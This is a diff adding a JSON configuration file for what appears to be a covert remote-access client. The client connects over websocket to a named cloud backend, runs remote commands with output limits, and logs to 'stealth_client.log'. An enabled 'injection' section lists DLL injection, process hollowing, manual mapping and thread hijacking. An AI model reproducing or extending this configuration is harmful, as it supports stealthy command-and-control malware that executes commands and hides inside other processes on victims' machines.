@@ -1,0 +1,25 @@
+{
+    "websocket": {
+        "url": "wss://loopjs-backend-361659024403.us-central1.run.app/ws",
+        "reconnect_interval": 5,
+        "auto_reconnect": true
+    },
+    "client": {
+        "heartbeat_interval": 30,
+        "command_timeout": 30,
+        "max_output_size": 1048576
+    },
+    "injection": {
+        "enabled": true,
+        "methods": [
+            "dll_injection",
+            "process_hollowing", 
+            "manual_mapping",
+            "thread_hijacking"
+        ]
+    },
+    "logging": {
+        "level": "info",
+        "file": "stealth_client.log"
+    }
+}
